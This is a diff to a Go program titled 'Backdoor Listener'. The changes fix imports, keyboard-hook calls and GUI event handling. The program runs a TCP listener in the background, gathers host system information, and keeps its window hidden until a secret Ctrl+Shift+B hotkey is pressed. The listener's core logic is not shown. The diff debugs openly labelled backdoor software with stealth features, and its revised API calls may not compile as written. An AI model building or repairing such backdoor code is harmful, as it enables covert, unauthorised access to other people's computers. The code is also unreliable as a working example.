@@ -17,13 +17,13 @@ import (
 	"time"
 
 	"github.com/lxn/walk"
-	. "github.com/lxn/walk/declarative" // Using dot import for declarative
-	"github.com/micmonay/keybd_event"   // Corrected import for keyboard events
+	. "github.com/lxn/walk/declarative"
+	"github.com/micmonay/keybd_event"
 )
 
 const (
-	HOST = "127.0.0.1" // Default listener host
-	PORT = "12345"    // Default listener port
+	HOST = "127.0.0.1"
+	PORT = "12345"
 	TYPE = "tcp"
 )
 
@@ -36,7 +36,7 @@ var (
 	logTextEdit       *walk.TextEdit
 	stopListener      chan struct{}
 	startListenerOnce sync.Once
-	kb                keybd_event.Keybd
+	kb                keybd_event.KeyBonding
 	uiVisible         bool
 	uiMutexLocal      sync.Mutex
 )
@@ -97,7 +97,7 @@ func getSysInfo() string {
 	osName := runtime.GOOS
 	arch := runtime.GOARCH
 	hostname, _ := os.Hostname()
-	username := "N/A" // Getting username reliably across platforms is tricky
+	username := "N/A"
 	return fmt.Sprintf("OS: %s\nArchitecture: %s\nHostname: %s\nUsername: %s", osName, arch, hostname, username)
 }
 
@@ -170,7 +170,7 @@ func stopListenerService() {
 		close(stopListener)
 		listenerConn = nil
 		logMessage("Stopping listener service...")
-		startListenerOnce = sync.Once{} // Reset the once for potential restart
+		startListenerOnce = sync.Once{}
 	} else {
 		logMessage("Listener service is not running.")
 	}
@@ -185,21 +185,18 @@ func connectButtonHandler() {
 }
 
 func logMessage(message string) {
-	walk.App().Synchronize(func() {
-		if logTextEdit != nil {
-			logTextEdit.AppendText(fmt.Sprintf("[%s] %s\r\n", time.Now().Format("2006-01-02 15:04:05"), message))
-		}
-	})
-	log.Println(message) // Also log to the console for debugging
+	if mainWindow != nil {
+		mainWindow.Synchronize(func() {
+			if logTextEdit != nil {
+				logTextEdit.AppendText(fmt.Sprintf("[%s] %s\r\n", time.Now().Format("2006-01-02 15:04:05"), message))
+			}
+		})
+	}
+	log.Println(message)
 }
 
 func createUIWrapper(config Config) {
-	app, err := walk.NewApp()
-	if err != nil {
-		log.Fatal("Failed to create walk app:", err)
-	}
-
-	mw, err := MainWindow{
+	err := MainWindow{
 		Title:   "Backdoor Listener",
 		MinSize: Size{Width: 300, Height: 200},
 		Layout:  VBox{},
@@ -220,18 +217,18 @@ func createUIWrapper(config Config) {
 			},
 			Label{Text: "Log:"},
 			TextEdit{
-				AssignTo:    &logTextEdit,
-				ReadOnly:    true,
-				VScroll:     true,
-				Multiline:   true,
+				AssignTo:     &logTextEdit,
+				ReadOnly:     true,
+				VScroll:      true,
 				CompactHeight: false,
 			},
 		},
-		OnClose: func() {
-			stopListenerService()
-			app.Exit(0)
-			uiVisible = false
-			mainWindow = nil
+		Events: Events{
+			Closing: func(canceled *bool, reason CloseReason) {
+				stopListenerService()
+				uiVisible = false
+				mainWindow = nil
+			},
 		},
 		AssignTo: &mainWindow,
 	}.Create()
@@ -241,7 +238,7 @@ func createUIWrapper(config Config) {
 	}
 
 	mainWindow.Show()
-	app.Run()
+	mainWindow.Run()
 }
 
 func main() {
@@ -251,20 +248,12 @@ func main() {
 	}
 
 	var err error
-	kb, err = keybd_event.NewKeybd()
+	kb, err = keybd_event.NewKeyBonding()
 	if err != nil {
 		log.Fatal("Error creating keybd instance:", err)
 	}
 
-	// Load initial config
 	config := loadConfig()
-
-	// Key combination to toggle UI visibility (Ctrl + Shift + B)
-	hotkey := []keybd_event.KeyCombo{
-		{Code: keybd_event.VK_CONTROL},
-		{Code: keybd_event.VK_SHIFT},
-		{Code: keybd_event.VK_B},
-	}
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
@@ -275,25 +264,20 @@ func main() {
 			case <-ctx.Done():
 				return
 			default:
-				pressed := true
-				for _, k := range hotkey {
-					if !kb.IsPressed(int(k.Code)) {
-						pressed = false
-						break
-					}
-				}
-				if pressed {
+				if kb.IsPressed(keybd_event.VK_CONTROL) &&
+					kb.IsPressed(keybd_event.VK_SHIFT) &&
+					kb.IsPressed(keybd_event.VK_B) {
 					uiMutexLocal.Lock()
 					if !uiVisible {
 						uiVisible = true
 						go createUIWrapper(config)
 					} else if mainWindow != nil {
-						walk.App().Synchronize(func() {
+						mainWindow.Synchronize(func() {
 							mainWindow.Show()
 						})
 					}
 					uiMutexLocal.Unlock()
-					time.Sleep(time.Millisecond * 500) // Debounce
+					time.Sleep(time.Millisecond * 500)
 				}
 				time.Sleep(time.Millisecond * 100)
 			}
@@ -301,10 +285,6 @@ func main() {
 	}()
 
 	log.Println("Backdoor listener running in the background. Press Ctrl+Shift+B to open UI.")
-
-	// Start the listener with the initial configuration in the background
 	startListener(config.Host, config.Port)
-
-	// Keep the main goroutine alive
 	select {}
 }
